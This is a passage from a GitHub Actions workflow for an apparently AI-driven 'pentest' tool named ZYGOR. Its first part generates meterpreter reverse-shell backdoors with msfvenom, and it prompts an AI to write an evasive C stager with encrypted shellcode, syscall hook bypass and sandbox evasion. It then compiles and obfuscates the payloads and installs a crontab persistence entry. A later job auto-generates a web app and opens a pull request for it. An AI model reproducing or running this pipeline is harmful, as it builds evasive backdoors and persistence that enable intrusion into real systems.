            2>/dev/null || echo "msfvenom not available"

          # Generate Windows payload
          msfvenom -p windows/x64/meterpreter/reverse_tcp \
            LHOST=$LHOST LPORT=$LPORT \
            -f exe -o /tmp/exploit_output/backdoor.exe \
            2>/dev/null || true

          # Generate PowerShell one-liner
          msfvenom -p windows/x64/meterpreter/reverse_tcp \
            LHOST=$LHOST LPORT=$LPORT \
            -f psh-reflection -o /tmp/exploit_output/backdoor.ps1 \
            2>/dev/null || true

          # AI-generated C stager
          PROMPT="Write a C language stager that:
          1. Decrypts and loads shellcode from an embedded XOR-encrypted blob
          2. Uses direct syscalls to avoid hooking
          3. Implements sleep jitter to evade sandbox detection
          4. Connects back to $LHOST:$LPORT
          5. Output ONLY the C code, no explanations"

          ai_complete 4096 <<< "$PROMPT" > /tmp/exploit_output/advanced_stager.c 2>/dev/null || true

          # Compile C stager
          if [ -s /tmp/exploit_output/advanced_stager.c ]; then
            x86_64-linux-gnu-gcc -O2 -s -o /tmp/exploit_output/advanced_stager \
              /tmp/exploit_output/advanced_stager.c -nostdlib -static 2>/dev/null || \
            gcc -O2 -s -o /tmp/exploit_output/advanced_stager \
              /tmp/exploit_output/advanced_stager.c 2>/dev/null || true
          fi

          # Obfuscate if enabled
          if [ -f /tmp/exploit_output/backdoor.elf ]; then
            python3 /opt/zygor/bin/obfuscate_payload.py \
              /tmp/exploit_output/backdoor.elf \
              /tmp/exploit_output/backdoor_obfuscated.py 2>/dev/null || true
          fi

          # Deploy persistence if exfil enabled
          if [ "${ENABLE_EXFIL}" = "true" ]; then
            echo "Deploying persistence..."
            mkdir -p /tmp/persistence
            cp /tmp/exploit_output/backdoor.elf /tmp/persistence/ 2>/dev/null || true
            cp /tmp/exploit_output/advanced_stager /tmp/persistence/ 2>/dev/null || true
            chmod -R 777 /tmp/persistence

            # Add crontab persistence
            (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/persistence/backdoor.elf") | crontab - 2>/dev/null || true
            echo "Persistence deployed to /tmp/persistence/"
          fi

          echo "::endgroup::"

      # ── Upload exploit artifacts ────────────────────────────────────────────────────────────
      - name: '📤 Upload exploit artifacts'
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: exploits-${{ matrix.attack }}-${{ github.run_id }}
          path: |
            /tmp/exploit_output/
          if-no-files-found: warn

  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  # JOB 5: 🌐 WEB FORGE – AI Full-Stack Application Generator
  # ═════════════════════════════════════════════════════════════════════════════════════════════════
  web_forge:
    name: '🌐 Phase 3 – Web Forge AI Generator'
    needs: [bootstrap]
    runs-on: ${{ secrets.RUNNER_LABELS || 'ubuntu-latest' }}
    timeout-minutes: 360
    if: |
      github.event_name == 'schedule' ||
      inputs.penetration_phase == 'web_forge' ||
      inputs.penetration_phase == 'full'
    steps:
      - name: '📥 Checkout'
        uses: actions/checkout@v4
        with:
          lfs: true

      - name: '🔧 Setup'
        shell: bash
        run: |
          export PATH="/opt/zygor/bin:$PATH"
          echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
          mkdir -p /tmp/web_forge_output

      - name: '🤖 AI Generates Full-Stack Application'
        shell: bash
        run: |
          echo "::group::AI Web Application Generation"
          APP_DESC="A collaborative real-time whiteboard application with user authentication, drawing tools, chat, and project management. Include React frontend with Tailwind CSS, Node.js/Express backend with WebSocket support, PostgreSQL database with Prisma ORM, Docker and Docker Compose, and Kubernetes manifests."

          echo "Generating application: $APP_DESC"
          PROMPT="Generate a complete, production-ready full-stack web application.

          Description: $APP_DESC

          REQUIREMENTS:
          - Frontend: React 18 with Vite, Tailwind CSS, Socket.io-client, React Router v6, context API for state
          - Backend: Node.js 20 with Express, Socket.io, JWT authentication, bcrypt, Prisma ORM
          - Database: PostgreSQL with full schema, migrations, and seed data
          - Docker: Multi-stage Dockerfiles for frontend and backend, docker-compose.yml with PostgreSQL
          - Kubernetes: deployment.yaml, service.yaml, configmap.yaml, secret.yaml for both frontend and backend
          - CI/CD: GitHub Actions workflow for deploy

          FORMAT: Output each file with exactly '# FILE: path/to/filename' on a line above the file contents.
          Make the code COMPLETE, functional, and ready to run with 'docker-compose up'."

          ai_complete 16384 <<< "$PROMPT" > /tmp/web_forge_output/generated_app.txt 2>/dev/null || true

          # Parse the output into files
          python3 << 'PARSE_EOF'
          import os, re, glob

          content = open('/tmp/web_forge_output/generated_app.txt').read()
          project_root = '/tmp/web_forge_output/app'
          os.makedirs(project_root, exist_ok=True)

          current_file = None
          current_lines = []

          for line in content.split('\n'):
              match = re.match(r'^#\s*FILE:\s*(.+)$', line)
              if match:
                  # Save previous file
                  if current_file and current_lines:
                      filepath = os.path.join(project_root, current_file)
                      os.makedirs(os.path.dirname(filepath), exist_ok=True)
                      with open(filepath, 'w') as f:
                          f.write('\n'.join(current_lines))
                      print(f"Created: {current_file}")
                  current_file = match.group(1).strip()
                  current_lines = []
              else:
                  current_lines.append(line)

          # Save last file
          if current_file and current_lines:
              filepath = os.path.join(project_root, current_file)
              os.makedirs(os.path.dirname(filepath), exist_ok=True)
              with open(filepath, 'w') as f:
                  f.write('\n'.join(current_lines))
              print(f"Created: {current_file}")

          # Count files
          count = sum(1 for _ in glob.glob(f'{project_root}/**/*', recursive=True) if os.path.isfile(_))
          print(f"\nTotal files created: {count}")
          PARSE_EOF

          echo "::endgroup::"

      - name: '🐳 Build and Test Docker Compose'
        shell: bash
        run: |
          echo "::group::Docker Build & Test"
          cd /tmp/web_forge_output/app

          if [ -f docker-compose.yml ]; then
            echo "Building Docker images..."
            timeout 300 docker-compose build 2>&1 || true
            echo "Docker build completed. See logs above."
          elif [ -f docker-compose.yaml ]; then
            echo "Building Docker images..."
            timeout 300 docker-compose build 2>&1 || true
          else
            echo "No docker-compose file found, skipping Docker build"
            # Try to find Dockerfiles
            find . -name "Dockerfile*" -type f 2>/dev/null | head -5
          fi

          echo "::endgroup::"

      - name: '📝 Commit and Create Pull Request'
        shell: bash
        run: |
          echo "::group::Git Commit & PR"

          cd /tmp/web_forge_output/app
          if [ -d .git ] || git status >/dev/null 2>&1; then
            echo "Git repository exists"
          else
            git init
            git checkout -b webforge-$(date +%Y%m%d-%H%M%S)
          fi

          git config user.email "zygor@pentest.ai"
          git config user.name "ZYGOR v4.0 AI"

          git add .
          git commit -m "🌐 ZYGOR WebForge: AI-generated full-stack application $(date -u)" 2>/dev/null || true

          # Try to push and create PR
          if [ -n "${GITHUB_TOKEN_ABORT}" ]; then
            git remote add origin "https://x-access-token:${GITHUB_TOKEN_ABORT}@github.com/${GITHUB_REPOSITORY}.git" 2>/dev/null || true
            BRANCH=$(git rev-parse --abbrev-ref HEAD)
            git push -u origin $BRANCH 2>/dev/null || true

            # Create PR
            curl -s -X POST \
              -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
              -H "Content-Type: application/json" \
              -d '{
                "title": "🌐 ZYGOR WebForge: AI Generated Application",
                "body": "This PR was automatically generated by ZYGOR v4.0 AI Web Forge module.\n\nContains a full-stack application generated by AI.\n\n**Review and deploy at your own risk.**",
                "head": "'$BRANCH'",
                "base": "main"
              }' \
              "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls" 2>/dev/null || true
          fi

          echo "::endgroup::"

      - name: '📤 Upload Web Forge artifacts'
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: webforge-app-${{ github.run_id }}
          path: /tmp/web_forge_output/app/
          if-no-files-found: warn

